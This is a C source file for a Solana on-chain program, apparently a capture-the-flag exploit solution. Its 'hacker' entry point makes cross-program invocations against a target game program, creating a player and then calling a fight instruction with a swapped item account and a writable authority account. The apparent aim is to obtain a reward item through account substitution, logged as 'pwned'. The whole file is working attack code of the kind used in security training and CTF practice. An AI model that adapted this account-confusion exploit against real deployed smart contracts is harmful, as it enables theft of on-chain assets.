#include <solana_sdk.h>

typedef struct
{
  uint8_t vault_seed;
  uint8_t authority_seed;
  uint8_t player_seed;
  uint8_t solve_item_seed;
  uint8_t solve_item_1337_seed;
  uint8_t name[31];
} CreatePlayerInstr;

typedef struct
{
  uint8_t vault_seed;
  uint8_t authority_seed;
  uint8_t amount;
} BuyInstr;

typedef struct
{
  uint8_t vault_seed;
  uint8_t authority_seed;
  uint8_t amount;
} SellInstr;

typedef struct
{
  uint8_t vault_seed;
  uint8_t number;
  uint8_t monster;
} FightInstr;

typedef struct
{
  uint8_t health;
  uint8_t mana;
  char name[30];
} Player;

#define CLOCK 0
#define SYSTEM 1
#define SPL_TOKEN 2
#define ITEM_MINT 3
#define SOLVE_ITEM 4
#define ITEM1337_MINT 5
#define SOLVE_ITEM1337 6
#define AUTHORITY 7
#define USER 8
#define SANITY 9
#define RENT 10
#define PLAYER 11
#define VAULT 12
#define TARGET 13
#define WEAPONS 14
#define ITEM 15
#define ITEM1337 16
#define FAKE_ITEM 17
#define FAKE_ITEM1337 18
#define FAKE_WEAPON 19
#define FAKE_SANITY 20
#define FAKE_TOKEN 21
#define FAKE_PLAYER 22
#define FAKE_TOKEN1 23
#define FAKE_TOKEN2 24
#define ACCOUNT_CNT 25

uint64_t create_player(SolParameters *params)
{
  sol_log("[+] About to create_player !");

  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CLOCK].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SYSTEM].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SPL_TOKEN].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[ITEM_MINT].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SOLVE_ITEM].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[ITEM1337_MINT].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SOLVE_ITEM1337].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[AUTHORITY].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[SANITY].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[RENT].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[PLAYER].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[VAULT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[WEAPONS].key, .is_writable = false, .is_signer = false},
  };

  uint8_t buf[4 + 5 + 32] = {0};
  buf[0] = 3;
  CreatePlayerInstr *p = (CreatePlayerInstr *)((uint8_t *)buf + 4);

  p->vault_seed = params->data[0];
  p->authority_seed = params->data[1];
  p->player_seed = params->data[2];
  p->solve_item_seed = params->data[3];
  p->solve_item_1337_seed = params->data[4];
  sol_memcpy(p->name, "ainevsia", 8);

  const SolInstruction instruction = {params->ka[TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};

  sol_invoke(&instruction, params->ka, params->ka_num);

  sol_log("[+] finished create_player !");
  return SUCCESS;
}

uint64_t fight1337(SolParameters *params)
{
  sol_log("[+] About to fight !");

  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CLOCK].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SYSTEM].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SPL_TOKEN].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[ITEM1337/* SOLVE_ITEM1337 */].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[AUTHORITY].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[SANITY].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[VAULT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[PLAYER].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[WEAPONS].key, .is_writable = false, .is_signer = false},
  };

  uint8_t buf[4 + 3] = {0};
  buf[0] = 4;
  FightInstr *p = (FightInstr *)((uint8_t *)buf + 4);
  p->vault_seed = params->data[0];
  p->number = 1;
  p->monster = 8;
  const SolInstruction instruction = {params->ka[TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};
  sol_invoke(&instruction, params->ka, params->ka_num);

  sol_log("[+] finished fight !");
  return SUCCESS;
}

uint64_t hacker(SolParameters *params)
{
  sol_assert(params->ka_num == ACCOUNT_CNT);
  sol_log("[+] About to pwn !");
  create_player(params);
  fight1337(params);
  sol_log("[+] pwned !");
  return SUCCESS;
}

extern uint64_t entrypoint(const uint8_t *input)
{
  sol_log("[+] Hacker start");

  SolAccountInfo accounts[ACCOUNT_CNT];
  SolParameters params = (SolParameters){.ka = accounts};

  if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts)))
  {
    return ERROR_INVALID_ARGUMENT;
  }

  return hacker(&params);
}
